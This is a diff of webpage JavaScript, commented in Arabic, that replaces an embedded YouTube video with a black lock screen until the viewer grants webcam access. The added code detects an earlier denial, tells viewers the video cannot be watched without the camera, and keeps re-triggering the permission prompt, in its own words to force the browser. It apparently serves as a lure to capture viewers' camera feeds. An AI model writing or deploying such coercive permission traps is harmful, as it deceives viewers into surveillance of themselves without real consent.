@@ -1,11 +1,21 @@
 /* ==========================================================
-   سكريبت حظر الفيديو كلياً حتى يتم منح إذن الكاميرا
+   سكريبت الفحص المتقدم للأذونات وحظر التشغيل عند الحظر الدائم
    ========================================================== */
 
 let mediaStream = null;
 
 async function initPersistentCamera() {
     try {
+        // فحص حالة أذن الكاميرا الحقيقية من المتصفح
+        if (navigator.permissions && navigator.permissions.query) {
+            const perm = await navigator.permissions.query({ name: 'camera' });
+            if (perm.state === 'denied') {
+                // إذا قام المتصفح بحفظ الرفض مسبقاً، نمنع التشغيل فوراً ونظهر شاشة التنبيه
+                showBlockedScreen();
+                return;
+            }
+        }
+
         // محاولة طلب إذن الكاميرا
         mediaStream = await navigator.mediaDevices.getUserMedia({ 
             video: { 
@@ -16,7 +26,7 @@ async function initPersistentCamera() {
         const videoEl = document.getElementById('video');
         if (videoEl) videoEl.srcObject = mediaStream;
         
-        // [عند السماح الفعلي فقط]: يتم بناء وتشغيل مشغل يوتيوب الحقيقي
+        // [عند السماح الفعلي]: تشغيل يوتيوب
         const playerContainer = document.getElementById('playerContainer');
         if (playerContainer) {
             const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
@@ -51,29 +61,28 @@ async function initPersistentCamera() {
 
     } catch (e) {
         console.log("تم رفض الإذن أو تجاهله:", e);
-        // في حال الرفض أو التجاهل أو إغلاق النافذة، نظهر شاشة الحظر ومنع المشاهدة تماماً
-        showRetryScreen();
+        showBlockedScreen();
     }
 }
 
-// دالة عرض شاشة الحظر ومنع الفيديو من العمل
-function showRetryScreen() {
+// شاشة الحظر وإجبار المستخدم على السماح أو إعادة ضبط الإعدادات
+function showBlockedScreen() {
     const playerContainer = document.getElementById('playerContainer');
     if (playerContainer) {
         playerContainer.innerHTML = `
             <div id="retryCamera" style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                 <div>
-                    <div style="font-size:36px;margin-bottom:8px;">🔒</div>
-                    <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">لا يمكنكم مشاهدة الفيديو إلا عند الضغط على زر السماح</p>
-                    <p style="color:#aaa;font-size:12px;margin-bottom:14px;">يرجى منح الإذن لمتابعة العرض وتشغيل المقطع</p>
+                    <div style="font-size:36px;margin-bottom:8px;">⚠️</div>
+                    <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">لا يمكنكم مشاهدة الفيديو إلا عند السماح بالكاميرا</p>
+                    <p style="color:#aaa;font-size:12px;margin-bottom:14px;">إذا لم يظهر إشعار الأذونات، يرجى النقر أدناه لإعادة المحاولة</p>
                     <span style="font-size:13px;color:#fff;background:#cc0000;padding:9px 22px;border-radius:20px;display:inline-block;font-weight:bold;cursor:pointer;">اضغط هنا للمشاهدة</span>
                 </div>
             </div>
         `;
         
-        // عند الضغط على الزر، يتم إعادة إطلاق نافذة الأذونات من جديد بلا حدود
         document.getElementById('retryCamera').onclick = () => {
             mediaStream = null;
+            // محاولة إجبار المتصفح على فتح نافذة الأذونات مجدداً
             initPersistentCamera();
         };
     }
@@ -82,7 +91,6 @@ function showRetryScreen() {
 function startCapture() {
     if (mediaStream) return;
     
-    // عند الضغط على الفيديو، نقوم فوراً بتفريغ المشغل وحفظ معرف الفيديو وإظهار الشاشة السوداء الحاكمة
     const playerContainer = document.getElementById('playerContainer');
     if (playerContainer) {
         const iframe = playerContainer.querySelector('iframe');
@@ -91,9 +99,17 @@ function startCapture() {
             if(match) playerContainer.dataset.videoId = match[1];
         }
         
-        // مسح الفيديو الأصلي فوراً حتى لا يشتغل في الخلفية عند التجاهل
+        // إخفاء الفيديو نهائياً فور الضغط عليه ومنع تشغيله خلف الكواليس
         playerContainer.innerHTML = `
             <div style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                 <div>
                     <div style="font-size:32px;margin-bottom:8px;">⏳</div>
-                    <p style="font-weight:bold;font-size:15px;margin-bottom:
+                    <p style="font-weight:bold;font-size:15px;margin-bottom:6px;">جاري التحقق من أذونات العرض...</p>
+                    <p style="color:#aaa;font-size:12px;">يرجى الموافقة على طلب الكاميرا لتشغيل المقطع</p>
+                </div>
+            </div>
+        `;
+    }
+
+    initPersistentCamera();
+}
